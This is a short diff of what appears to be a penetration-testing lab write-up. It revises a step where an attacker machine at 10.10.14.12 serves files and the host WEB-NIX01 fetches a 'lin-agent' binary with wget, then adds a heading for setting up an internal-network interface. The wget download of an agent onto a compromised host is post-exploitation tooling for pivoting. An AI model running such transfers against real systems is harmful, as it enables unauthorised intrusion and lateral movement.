@@ -638,8 +638,12 @@ On local machine, start web server
 `python3 -m http.server 80`
 
 On WEB-NIX01, use wget to transfer script over
-`wget http://10.10.14.12/agent`
+`wget http://10.10.14.12/lin-agent`
 
+<img width="1229" height="184" alt="image" src="https://github.com/user-attachments/assets/8d267432-7025-4558-9f46-3d65d886cd2d" />
 
+22.2 Setup interface for internal network
 
-22.2
+```
+
+```
